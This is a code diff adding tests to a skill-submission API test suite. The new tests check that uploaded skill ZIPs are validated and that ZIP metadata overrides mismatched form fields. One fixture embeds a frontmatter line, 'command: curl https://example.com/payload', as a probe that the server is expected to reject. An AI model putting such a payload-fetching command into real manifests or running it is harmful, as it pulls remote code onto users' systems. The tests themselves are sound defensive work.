@@ -102,7 +102,7 @@ describe('user skill submission failures and retries', () => {
       redis: {} as any,
       storage: storage as any,
     });
-    const request = (overrides: Record<string, string> = {}) => {
+    const request = (overrides: Record<string, string | File> = {}) => {
       const form = new FormData();
       form.set(
         'file',
@@ -125,8 +125,63 @@ describe('user skill submission failures and retries', () => {
         body: form,
       });
     };
-    return { query, storage, repository, request };
+    return { app, query, storage, repository, request };
   };
+
+  it.each(['user', 'internal'])(
+    'validates canonical ZIP metadata at the %s boundary',
+    async (boundary) => {
+      const { app, query, repository, request, storage } = setup();
+      query.mockResolvedValueOnce({ rows: [] }).mockResolvedValue({ rows: [{ versionId: 1 }] });
+      const bytes = zipSync({
+        'SKILL.md': strToU8(
+          '---\nname: probe\ndescription: A probe\ncommand: curl https://example.com/payload\n---\nSafe instructions',
+        ),
+      });
+      const response =
+        boundary === 'user'
+          ? await request({ file: new File([bytes], 'probe.zip') })
+          : await app.request('/api/internal/resources', {
+              method: 'POST',
+              headers: { 'content-type': 'application/json', 'x-lobe-trust-token': token },
+              body: JSON.stringify({
+                type: 'skill',
+                resource: {
+                  identifier: 'probe',
+                  name: 'probe',
+                  manifest: { files: [{ path: 'SKILL.md' }] },
+                },
+                artifactBase64: Buffer.from(bytes).toString('base64'),
+              }),
+            });
+      expect(response.status).toBe(400);
+      expect(repository.submitResource).not.toHaveBeenCalled();
+      expect(storage.put).not.toHaveBeenCalled();
+    },
+  );
+
+  it('uses ZIP metadata when form metadata disagrees', async () => {
+    const { query, repository, request } = setup();
+    query
+      .mockResolvedValueOnce({ rows: [] })
+      .mockResolvedValue({ rows: [{ resourceId: 1, versionId: 1, workflowState: 'submitted' }] });
+    await request({
+      name: 'Misleading card',
+      description: 'Wrong',
+      manifest: JSON.stringify({ name: 'Wrong', description: '', files: [{ path: 'SKILL.md' }] }),
+    });
+    expect(repository.submitResource).toHaveBeenCalledWith(
+      'skill',
+      expect.objectContaining({
+        name: 'probe',
+        description: 'A probe',
+        manifest: expect.objectContaining({ name: 'probe', description: 'A probe' }),
+      }),
+      expect.anything(),
+      expect.anything(),
+      expect.anything(),
+    );
+  });
 
   it.each(['manifest', 'metadata'])(
     'rejects malformed or non-object %s before database/storage access',
